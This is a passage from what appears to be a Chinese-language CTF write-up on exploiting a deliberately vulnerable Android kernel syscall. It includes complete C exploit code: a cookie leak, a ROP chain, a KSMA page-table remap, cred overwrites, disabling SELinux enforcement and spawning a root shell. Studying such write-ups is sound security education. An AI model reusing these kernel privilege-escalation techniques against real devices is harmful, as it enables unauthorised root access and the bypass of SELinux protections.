class="keyword">long</span> cred_addr = <span class="number">0</span>;</span><br><span class="line">    read_kernel((<span class="keyword">void</span>*)(task_addr+<span class="number">0x5D8</span>), &amp;cred_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cred_addr: 0x%lx\n&quot;</span>, cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> root_id = <span class="number">0</span>;    </span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">4</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">8</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">12</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">16</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">20</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">24</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">28</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line">    write_kernel4((<span class="keyword">char</span>*)(cred_addr+<span class="number">32</span>), (<span class="keyword">char</span>*)&amp;root_id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> root_cap = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x28</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x30</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x38</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x40</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    write_kernel((<span class="keyword">char</span>*)cred_addr+<span class="number">0x48</span>, (<span class="keyword">char</span>*)&amp;root_cap);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get root shell\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="android-10"   >
          <a href="#android-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-10" class="headerlink" title="android 10"></a>android 10</h2>
      <blockquote>
<p>内核版本：linux 4.14.175</p>
</blockquote>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">generic_arm64:/ <span class="comment"># cat /proc/iomem</span></span><br><span class="line">[...]</span><br><span class="line">40000000-bfffffff : System RAM</span><br><span class="line">  40080000-40b9ffff : Kernel code</span><br><span class="line">  40da0000-40f0ffff : Kernel data</span><br><span class="line">[...]</span><br></pre></td></tr></table></div></figure>


<p>这个版本跟上一个版本相比，栈中多了cookie，函数返回时多了对cookie的检查。但cookie是固定值，可通过stackof_read() 泄露出来。</p>
<p>所以，使用 stackof_write() 写返回地址时，提前将cookie布置好。rop完成一次任意地址写（不能动 X8 X9 X28三个寄存器），然后修复 x29 x30 sp，回到用户态。</p>
<p>任意地址写直接使用KSMA方法改页表，重新映射整个内核镜像为用户态可读写，使用户态可以任意改写内核代码段和数据段。</p>
<p>三条gadget：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffff8008464a0c</span>;     <span class="comment">// : sub sp, x29, #0x10 ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffff80084f51c0</span>;     <span class="comment">//  : str x19, [x20, #0x10] ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffff80080a745c</span>;     <span class="comment">// : ldp x29, x30, [sp], #0x80 ; ret</span></span><br></pre></td></tr></table></div></figure>


<p>本地root shell：</p>
<p><img   src="image-20230906141248747.png?size=600" style="width: 600px;"  alt="image-20230906141248747"></p>
<p>exp如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_RET 0xFFFFFFC0000BECC8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffff8008464a0c</span>;     <span class="comment">// : sub sp, x29, #0x10 ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffff80084f51c0</span>;     <span class="comment">//  : str x19, [x20, #0x10] ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffff80080a745c</span>;     <span class="comment">// : ldp x29, x30, [sp], #0x80 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_read - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_write - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_PHYS_ADDR 0x40080000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RE_MAP_ADDR 0xFFFFFFC200000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_BASE 0xFFFFFF8008080000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFF8008EDA770</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> SYMBOL__swapper_pg_dir = <span class="number">0xffffff8008f0c000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mirror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_phys, <span class="keyword">unsigned</span> <span class="keyword">long</span> mirror_base)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> index1 = (mirror_base &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>; <span class="comment">// bits[39:31]</span></span><br><span class="line">    d_block_addr = SYMBOL__swapper_pg_dir + index1 * <span class="number">8</span>;  <span class="comment">// target Table Descriptor Address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descriptor: 0x%lx + %d x 8 = 0x%lx\n&quot;</span>, SYMBOL__swapper_pg_dir, index1, d_block_addr);</span><br><span class="line"></span><br><span class="line">    d_block = <span class="number">0</span>;</span><br><span class="line">    d_block |= <span class="number">0x1</span> ; <span class="comment">// Block entry</span></span><br><span class="line">    <span class="comment">/* Lower attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// bits[11], nG</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">10</span>); <span class="comment">// bits[10], AF</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">9</span>); <span class="comment">// bits[9], SH[1]</span></span><br><span class="line">    d_block |= <span class="number">0x40</span>; <span class="comment">// bits[7:6], AP[2:1] = 01</span></span><br><span class="line">    d_block |= <span class="number">0x20</span>; <span class="comment">// bits[5], NS</span></span><br><span class="line">    d_block |= <span class="number">0x10</span>; <span class="comment">// bits[2:0], AttrIndx[2:0]</span></span><br><span class="line">    d_block |= (kernel_phys &amp; <span class="number">0x0000ffffc0000000</span>); <span class="comment">// bits[47:30], output address</span></span><br><span class="line">    <span class="comment">/* Upper attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">52</span>); <span class="comment">// bits[52], Contiguous</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">53</span>); <span class="comment">// bits[53], PXN</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">54</span>); <span class="comment">// bits[54], XN</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d_block = 0x%lx\n&quot;</span>, d_block);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">char</span>* write_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(read_buf, <span class="number">0x0</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(write_buf, <span class="number">0x0</span>, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    hexdump(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_k_sp = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x100</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;real_k_sp: 0x%lx\n&quot;</span>,real_k_sp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k_cookie = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x100</span>]);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k_x28 = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x108</span>]);</span><br><span class="line">    <span class="comment">// unsigned long k_cookie_2 = *((unsigned long*)&amp;read_buf[0x110]);</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k_x29 = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x118</span>]);          <span class="comment">// 控制流劫持后，需要返回用户态时保持值</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k_x30 = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x120</span>]);          <span class="comment">// 控制流劫持后，需要返回用户态时保持值</span></span><br><span class="line">    <span class="comment">// unsigned long k_x29_2 = *((unsigned long*)&amp;read_buf[0x128]);</span></span><br><span class="line">    <span class="comment">// unsigned long k_x30_2 = *((unsigned long*)&amp;read_buf[0x130]);</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*padding*/</span></span><br><span class="line">    <span class="comment">// memset(write_buf,0x42,0x100);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*gadget*/</span> <span class="comment">/* str x19, [x20, #0x10] */</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x68</span>]) = d_block_addr<span class="number">-0x10</span>;         <span class="comment">// -&gt; x20 : d_block_addr-0x10</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x70</span>]) = d_block;         <span class="comment">// -&gt; x19 : d_block</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x78</span>]) = <span class="number">0x0</span>;         <span class="comment">// -&gt; x29 : x</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x80</span>]) = gadget2;         <span class="comment">// -&gt; x30 : gadget2</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x88</span>]) = <span class="number">0x0</span>;         <span class="comment">// -&gt; x20 : x</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x90</span>]) = <span class="number">0x0</span>;         <span class="comment">// -&gt; x19 : x</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x98</span>]) = <span class="number">0x0</span>;         <span class="comment">// -&gt; x29 : x</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0xa0</span>]) = gadget3;         <span class="comment">// -&gt; x30 : gadget3</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0xa8</span>]) = k_x29;         <span class="comment">// -&gt; x29 : k_x29</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0xb0</span>]) = k_x30;         <span class="comment">// -&gt; x30 : k_x30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x100</span>]) = k_cookie;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x108</span>]) = k_x28;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x110</span>]) = k_cookie;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x118</span>]) = k_x29<span class="number">-0xb0</span>;           <span class="comment">// x29 </span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;write_buf[<span class="number">0x120</span>]) = gadget1;           <span class="comment">// x30 gadget1</span></span><br><span class="line">    <span class="comment">// *((unsigned long*)&amp;write_buf[0x128]) = 0;           // second x29</span></span><br><span class="line">    <span class="comment">// *((unsigned long*)&amp;write_buf[0x130]) = 0;           // second x30</span></span><br><span class="line"></span><br><span class="line">    hexdump(write_buf, <span class="number">0x200</span>);</span><br><span class="line">    k_stackof_write(write_buf,<span class="number">0x128</span>);</span><br><span class="line">    <span class="comment">// k_stackof_write(write_buf,0x100);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// write kernel image</span></span><br><span class="line">    <span class="comment">/* selinux_enforcing*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr_new = RE_MAP_ADDR + <span class="number">0x80000</span> + (selinux_enforcing_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selinux_enforcing_addr_new: 0x%lx\n&quot;</span>, selinux_enforcing_addr_new);</span><br><span class="line">    *(<span class="keyword">int</span>*)selinux_enforcing_addr_new = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* sys_setresuid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr = <span class="number">0xFFFFFF80080C7074</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr_new = RE_MAP_ADDR + <span class="number">0x80000</span> + (setresuid_if_addr - IMAGE_BASE);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresuid_if_addr_new+<span class="number">3</span>) = <span class="number">0x36</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid_if_addr_new content: 0x%lx\n&quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)setresuid_if_addr_new);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* sys_setresgid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr = <span class="number">0xFFFFFF80080C7524</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr_new = RE_MAP_ADDR + <span class="number">0x80000</span> + (setresgid_if_addr - IMAGE_BASE);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresgid_if_addr_new+<span class="number">3</span>) = <span class="number">0x36</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresgid_if_addr_new content: 0x%lx\n&quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)setresgid_if_addr_new);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="android-11"   >
          <a href="#android-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-11" class="headerlink" title="android 11"></a>android 11</h2>
      <blockquote>
<p>内核版本： linux 5.4.50</p>
</blockquote>
<p>比赛期间这个题没继续往后做，以为shadow stack无法绕过（x18寄存器）。但赛后看别人做出来了，于是自己也想尝试一下，发现其实还是可以解的。</p>

        <h3 id="任意地址写"   >
          <a href="#任意地址写" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3>
      <p>在有shadow stack的情况下，虽然无法直接通过栈溢出写返回地址来控制流劫持，但还可以考虑这两个方向：</p>
<ol>
<li>返回过程中是否有函数指针？</li>
<li>返回过程中是否有可控的地址写？如STR,STP配合可控寄存器。</li>
</ol>
